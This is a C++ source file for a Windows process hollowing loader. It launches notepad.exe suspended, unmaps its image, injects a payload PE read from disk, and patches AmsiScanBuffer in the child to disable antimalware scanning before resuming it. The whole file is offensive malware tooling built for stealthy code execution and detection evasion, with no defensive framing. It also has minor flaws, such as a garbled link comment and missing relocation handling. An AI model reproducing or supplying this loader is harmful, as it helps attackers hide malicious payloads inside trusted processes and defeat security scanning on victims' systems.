// language: C++, file: hollow.cpp, target: Windows 11, MSVC
// Process hollowing loader — NtUnmapViewOfSection, remote write, SetThreadContext, AMSI patch
// link: kernel32.lib ntdll foot
#include <windows.h>
#include <winternl.h>
#include <cstdio>
#include <vector>
#include <string>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

// ---- minimal PE loader: maps a raw PE (exe) into the hollowed process ----
bool HollowInto(LPCWSTR targetPath, const std::vector<BYTE>& payload) {
    // read target PE headers
    IMAGE_DOS_HEADER dos;
    memcpy(&dos, payload.data(), sizeof(dos));
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return false;
    IMAGE_NT_HEADERS nt;
    memcpy(&nt, payload.data() + dos.e_lfanew, sizeof(nt));
    if (nt.Signature != IMAGE_NT_SIGNATURE) return false;
    if (nt.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;   // x64 -> x64

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(targetPath, nullptr, nullptr, nullptr, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return false;

    // unmap original image
    auto pUnmap = (fnNtUnmapViewOfSection)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection");
    if (pUnmap) pUnmap(pi.hProcess, (PVOID)nt.OptionalHeader.ImageBase);

    // allocate new image region (prefer same base)
    PVOID base = (PVOID)nt.OptionalHeader.ImageBase;
    SIZE_T regionSize = nt.OptionalHeader.SizeOfImage;
    void* allocated = VirtualAllocEx(pi.hProcess, base, regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!allocated) allocated = VirtualAllocEx(pi.hProcess, nullptr, regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!allocated) { TerminateProcess(pi.hProcess, 1); return false; }

    // write headers
    WriteProcessMemory(pi.hProcess, allocated, payload.data(), nt.OptionalHeader.SizeOfHeaders, nullptr);

    // write sections
    IMAGE_SECTION_HEADER sec;
    for (WORD i = 0; i < nt.FileHeader.NumberOfSections; i++) {
        memcpy(&sec, payload.data() + dos.e_lfanew + sizeof(nt) + i * sizeof(sec), sizeof(sec));
        WriteProcessMemory(pi.hProcess, (BYTE*)allocated + sec.VirtualAddress,
            payload.data() + sec.PointerToRawData, sec.SizeOfRawData, nullptr);
    }

    // AMSI bypass: patch AmsiScanBuffer in the child (amsi.dll is mapped on
    // process creation for most hosts). Return E_INVALIDARG immediately.
    {
        auto pAmsi = (BYTE*)GetProcAddress(GetModuleHandleW(L"amsi.dll"), "AmsiScanBuffer");
        if (pAmsi) {
            BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
            WriteProcessMemory(pi.hProcess, pAmsi, patch, sizeof(patch), nullptr);
        }
    }

    // set entrypoint
    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)allocated + nt.OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

int wmain() {
    // read payload from disk (compiled stub that also patches AMSI inside itself)
    HANDLE f = CreateFileW(L"payload.bin", GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) { wprintf(L"payload.bin fehlt\n"); return 1; }
    LARGE_INTEGER sz; GetFileSizeEx(f, &sz);
    std::vector<BYTE> buf((size_t)sz.QuadPart);
    DWORD rd; ReadFile(f, buf.data(), (DWORD)buf.size(), &rd, nullptr);
    CloseHandle(f);

    if (!HollowInto(L"C:\\Windows\\System32\\notepad.exe", buf)) { wprintf(L"hollow fehlgeschlagen\n"); return 2; }
    return 0;
}
